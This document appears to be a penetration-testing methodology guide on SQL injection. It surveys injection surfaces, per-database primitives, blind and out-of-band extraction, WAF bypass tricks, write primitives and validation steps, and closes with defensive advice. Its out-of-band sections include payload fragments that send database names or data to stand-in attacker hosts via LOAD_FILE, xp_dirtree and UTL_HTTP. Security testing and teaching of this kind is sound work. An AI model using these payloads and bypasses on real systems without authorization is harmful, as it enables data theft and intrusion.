# SQL INJECTION

## Critical

SQLi remains one of the most durable and impactful classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.

## Scope

- Classic relational DBMS: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins
- Integration paths: ORMs, query builders, stored procedures, search servers, reporting/exporters

## Methodology

1. Identify query shape: SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET, and whether user input influences identifiers vs values.
2. Confirm injection class: reflective errors, boolean diffs, timing, or out-of-band callbacks. Choose the quietest reliable oracle.
3. Establish a minimal extraction channel: UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS.
4. Pivot to metadata and high-value tables, then target impactful write primitives (auth bypass, role changes, filesystem access) if feasible.

## Injection Surfaces

- Path/query/body/header/cookie; mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: whereRaw/orderByRaw, string templates in ORMs; JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Detection Channels

- Error-based: provoke type/constraint/parser errors revealing stack/version/paths
- Boolean-based: pair requests differing only in predicate truth; diff status/body/length/ETag
- Time-based: SLEEP/pg_sleep/WAITFOR; use subselect gating to avoid global latency noise
- Out-of-band (OAST): DNS/HTTP callbacks via DB-specific primitives

## Union Visibility

- Determine column count and types via ORDER BY n and UNION SELECT null,...
- Align types with CAST/CONVERT; coerce to text/json for rendering
- When UNION is filtered, consider error-based or blind channels

## Dbms Primitives

### Mysql

- Version/user/db: @@version, database(), user(), current_user()
- Error-based: extractvalue()/updatexml() (older), JSON functions for error shaping
- File IO: LOAD_FILE(), SELECT ... INTO DUMPFILE/OUTFILE (requires FILE privilege, secure_file_priv)
- OOB/DNS: LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))
- Time: SLEEP(n), BENCHMARK
- JSON: JSON_EXTRACT/JSON_SEARCH with crafted paths; GIS funcs sometimes leak

### Postgresql

- Version/user/db: version(), current_user, current_database()
- Error-based: raise exception via unsupported casts or division by zero; xpath() errors in xml2
- OOB: COPY (program ...) or dblink/foreign data wrappers (when enabled); http extensions
- Time: pg_sleep(n)
- Files: COPY table TO/FROM '/path' (requires superuser), lo_import/lo_export
- JSON/JSONB: operators ->, ->>, @>, ?| with lateral/CTE for blind extraction

### Mssql

- Version/db/user: @@version, db_name(), system_user, user_name()
- OOB/DNS: xp_dirtree, xp_fileexist; HTTP via OLE automation (sp_OACreate) if enabled
- Exec: xp_cmdshell (often disabled), OPENROWSET/OPENDATASOURCE
- Time: WAITFOR DELAY '0:0:5'; heavy functions cause measurable delays
- Error-based: convert/parse, divide by zero, FOR XML PATH leaks

### Oracle

- Version/db/user: banner from v$version, ora_database_name, user
- OOB: UTL_HTTP/DBMS_LDAP/UTL_INADDR/HTTPURITYPE (permissions dependent)
- Time: dbms_lock.sleep(n)
- Error-based: to_number/to_date conversions, XMLType
- File: UTL_FILE with directory objects (privileged)

## Blind Extraction

- Branch on single-bit predicates using SUBSTRING/ASCII, LEFT/RIGHT, or JSON/array operators
- Binary search on character space for fewer requests; encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)

## Out Of Band

- Prefer OAST to minimize noise and bypass strict response paths; embed data in DNS labels or HTTP query params
- MSSQL: xp_dirtree \\\\<data>.attacker.tld\\a; Oracle: UTL_HTTP.REQUEST('http://<data>.attacker'); MySQL: LOAD_FILE with UNC

## Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: INTO OUTFILE/DUMPFILE, COPY TO, xp_cmdshell redirection; aim for webroot only when feasible and legal
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

## Waf And Parser Bypasses

- Whitespace/spacing: /**/, /**/!00000, comments, newlines, tabs, 0xe3 0x80 0x80 (ideographic space)
- Keyword splitting/concatenation: UN/**/ION, U%4eION, backticks/quotes, case folding
- Numeric tricks: scientific notation, signed/unsigned, hex (0x61646d696e)
- Encodings: double URL encoding, mixed Unicode normalizations (NFKC/NFD), char()/CONCAT_ws to build tokens
- Clause relocation: subselects, derived tables, CTEs (WITH), lateral joins to hide payload shape

## Orm And Query Builders

- Dangerous APIs: whereRaw/orderByRaw, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., @> in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (IN (...))

## Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with CASE WHEN for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: MATCH AGAINST, to_tsvector/to_tsquery with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates.
2. Extract verifiable metadata (version, current user, database name) using the established channel.
3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope.
4. Provide reproducible requests that differ only in the injected fragment.
5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant).

## False Positives

- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Impact

- Direct data exfiltration and privacy/regulatory exposure
- Authentication and authorization bypass via manipulated predicates
- Server-side file access or command execution (platform/privilege dependent)
- Persistent supply-chain impact via modified data, jobs, or procedures

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps.
2. Normalize responses (length/ETag/digest) to reduce variance when diffing.
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise.
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available.
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit whereRaw/orderByRaw.
6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly.
7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels.
8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types.
9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly.
10. Document exact query shapes; defenses must match how the query is constructed, not assumptions.

## Remember

Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
